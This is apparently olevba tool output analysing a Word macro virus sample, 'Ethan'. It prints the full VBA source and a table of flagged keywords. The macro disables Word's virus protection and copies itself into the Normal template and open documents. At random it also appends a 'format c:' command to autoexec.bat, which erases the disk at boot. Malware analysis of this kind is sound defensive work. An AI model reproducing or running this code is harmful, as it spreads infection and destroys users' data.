olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ethan.dp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ethan.dp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
savename = ActiveDocument.Saved
With Options
     .ConfirmConversions = False
     .VirusProtection = 0
     .SaveNormalPrompt = 0
 End With
 Application.EnableCancelKey = Not -1
If Dir("c:\winsys.log", 6) = "" Then
Open "c:\winsys.log" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
buff = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, buff
Next i
Close #1
SetAttr "c:\winsys.log", 6
End If
 daynum = Format(Date, "dd")
 monthnum = Format(Date, "mm")
 yearnum = Format(Date, "yyyy")
 reg = monthnum Mod 2
 Randomize
 Death = Int((10 * Rnd) + 1)
 If yearnum >= 2001 And Death = 5 Then
    If Dir("c:\autoexec.bat") <> "" Then
    cr = Chr(13) + Chr(10)
txt$ = " @echo ##############################################################################" + cr + "@echo ####         ##  #####  ##        ######      ####        ##  #####  #########" + cr + "@echo ####  #####  ##  ####   ########  #####  ###  ####  ########  #####  #########" + cr + "@echo ####  #####  ##  ### #  #######  #####  ####  ####  ########  #####  #########" + cr + "@echo ####  #####  ##  ## ##  #####   ######  ####  ####     #####  #####  #########" + cr + "@echo ####  #####  ##  # ###  #######  #####  ####  ####  ########  #####  #########" + cr + "@echo ####  #####  ##   ####  ########  ##            ##  ########  #####  #########" + cr + "@echo ####  #####  ##  #####  ##        ##  ########  ##        ##           #######" + cr + "@echo #####################################################################  #######" + cr + "@echo ##############################################################################" + cr
     SetAttr "c:\autoexec.bat", vbNormal
     str1$ = "@echo y|format c:/q/u >nul" + Chr(13) + Chr(10)
     Open "c:\autoexec.bat" For Binary Access Read Write As #1
     FileLength = LOF(1)
     str_ = Input(FileLength, #1)
     MyPos = InStr(1, str_, "path", 1)
     MyPos = InStr(MyPos, str_, Chr(13), 1)
     Put #1, MyPos + 2, txt$
     Put #1, , str1$
     Close #1
 End If
 End If
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    num = .CountOfLines
    .DeleteLines 1, num
    .AddFromFile "c:\winsys.log"
End With
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    num = .CountOfLines
    .DeleteLines 1, num
    .AddFromFile "c:\winsys.log"
End With
With Dialogs(wdDialogFileSummaryInfo)
    .Title = "BasTarD-2811"
    .Author = "$$$$$$"
    .Keywordsavename = "BasTarD-2811"
    .Execute
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

